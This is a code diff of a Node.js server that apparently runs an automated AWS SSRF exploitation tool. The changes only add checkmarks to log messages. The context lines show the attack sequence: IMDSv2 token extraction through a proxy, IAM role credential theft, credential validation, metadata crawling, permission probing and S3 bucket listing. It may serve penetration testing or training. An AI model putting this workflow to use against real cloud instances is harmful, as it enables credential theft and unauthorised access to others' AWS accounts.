@@ -93,7 +93,7 @@ app.post('/api/start', async (req, res) => {
         io.emit('exploitationComplete');
         return;
       }
-      emitLog('success', 'SSRF vulnerability confirmed');
+      emitLog('success', '✓ SSRF vulnerability confirmed');
       emitLog('info', 'Proxy is responding correctly to IMDS requests');
     } catch (error) {
       emitLog('error', `SSRF test error: ${error.message}`);
@@ -113,7 +113,7 @@ app.post('/api/start', async (req, res) => {
       return;
     }
     currentSession.token = token;
-    emitLog('success', 'IMDSv2 token extracted successfully');
+    emitLog('success', '✓ IMDSv2 token extracted successfully');
     emitLog('info', `Token TTL: 6 hours (21600 seconds)`);
     emitLog('info', `Token length: ${token.length} characters`);
     currentSession.summary.setIMDS({ token, totalMetadata: 0 });
@@ -126,7 +126,7 @@ app.post('/api/start', async (req, res) => {
       emitLog('warning', 'No IAM roles found on instance');
       emitLog('info', 'This instance may not have an IAM instance profile attached');
     } else {
-      emitLog('success', `Found ${roles.length} IAM role(s)`);
+      emitLog('success', `✓ Found ${roles.length} IAM role(s)`);
       emitLog('info', `Roles: ${roles.join(', ')}`);
       currentSession.roles = roles;
     }
@@ -139,7 +139,7 @@ app.post('/api/start', async (req, res) => {
       const creds = await imds.fetchCredentials(proxyUrl, token, role);
 
       if (creds) {
-        emitLog('success', `Credentials extracted for ${role}`);
+        emitLog('success', `✓ Credentials extracted for ${role}`);
         emitLog('info', `Access Key ID: ${creds.AccessKeyId}`);
         emitLog('info', `Expiration: ${creds.Expiration}`);
         currentSession.summary.addRole({
@@ -165,7 +165,7 @@ app.post('/api/start', async (req, res) => {
         emitLog('info', 'Running: aws sts get-caller-identity');
         const validation = await aws.validateCredentials(true);
         if (validation.valid) {
-          emitLog('success', `Credentials valid`);
+          emitLog('success', `✓ Credentials valid`);
           emitLog('info', `Account ID: ${validation.accountId}`);
           emitLog('info', `Region: ${validation.region}`);
           emitLog('info', `ARN: ${validation.arn || 'N/A'}`);
@@ -194,7 +194,7 @@ app.post('/api/start', async (req, res) => {
     emitLog('info', 'Recursively crawling /latest/meta-data endpoint...');
     const metadata = await s3discovery.enumerateIMDSRecursive(proxyUrl, token, '/latest/meta-data');
     const metadataCount = Object.keys(metadata).length;
-    emitLog('success', `Discovered ${metadataCount} metadata entries`);
+    emitLog('success', `✓ Discovered ${metadataCount} metadata entries`);
     emitLog('info', 'Metadata includes: instance-id, instance-type, placement, tags, user-data, etc.');
     currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });
 
@@ -203,7 +203,7 @@ app.post('/api/start', async (req, res) => {
     emitLog('info', 'Testing common AWS API calls to discover granted permissions...');
     const permResults = await permissions.discoverPermissionsByTesting();
     currentSession.permissions = permResults;
-    emitLog('success', `Discovered ${permResults.totalPermissions} permissions`);
+    emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
     emitLog('info', `Permissions by service: ${Object.keys(permResults.permissionsByService).length} services`);
     if (permResults.dangerousPermissionsList && permResults.dangerousPermissionsList.length > 0) {
       emitLog('warning', `Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
@@ -227,7 +227,7 @@ app.post('/api/start', async (req, res) => {
     try {
       const s3Results = await s3discovery.testS3Access();
       if (s3Results.buckets && s3Results.buckets.length > 0) {
-        emitLog('success', `Found ${s3Results.buckets.length} accessible S3 buckets`);
+        emitLog('success', `✓ Found ${s3Results.buckets.length} accessible S3 buckets`);
         emitLog('info', `S3 buckets: ${s3Results.buckets.join(', ')}`);
         io.emit('sessionUpdate', {
           s3Buckets: s3Results.buckets,
@@ -240,7 +240,7 @@ app.post('/api/start', async (req, res) => {
       emitLog('info', `Error: ${error.message}`);
     }
 
-    emitLog('success', 'Exploitation complete! All steps finished successfully.');
+    emitLog('success', '✓ Exploitation complete! All steps finished successfully.');
     emitLog('info', 'You can now use the action buttons to explore AWS resources.');
     io.emit('exploitationComplete');
   } catch (error) {
